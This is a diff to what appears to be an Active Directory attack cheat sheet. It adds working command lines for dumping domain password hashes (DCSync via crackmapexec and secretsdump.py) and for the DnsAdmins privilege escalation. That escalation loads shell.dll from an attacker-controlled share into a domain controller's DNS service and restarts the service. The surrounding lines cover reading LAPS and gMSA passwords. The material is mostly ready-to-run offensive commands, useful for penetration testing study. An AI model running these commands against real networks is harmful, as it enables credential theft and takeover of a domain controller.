@@ -109,13 +109,32 @@ pygpoabuse 'domain'/'user':'password' -gpo-id "12345677-ABCD-9876-ABCD-123456789
 
 ```bash
 pyLAPS.py --action get -d 'DOMAIN' -u 'USER' -p 'PASSWORD' --dc-ip dcIP
-crackmapexec ldap dcIP -d domain.com -u user -p password --module laps
+crackmapexec ldap dcIP -d domain.com -u user -p password -M laps
 ```
 
 ## Read GMSA Password
 
 ```bash
 gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
+```
+
+## DCSync
+
+```bash
+crackmapexec smb ip -u user -p pass --ntds
+secretsdump.py domian.com/user:'Pass'@dc.domain.com
+```
+
+## DNS Admins
+
+```bash
+# VIctim
+dnscmd dc1 /config /serverlevelplugindll \\attackerIP\share\shell.dll
+# Check
+Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+# Restart Service
+sc.exe \\dc01 stop dns
+sc.exe \\dc01 start dns
 ```
 
 
@@ -126,3 +145,4 @@ gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
 - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
 - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse
 - https://www.thehacker.recipes/a-d/recon
+- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
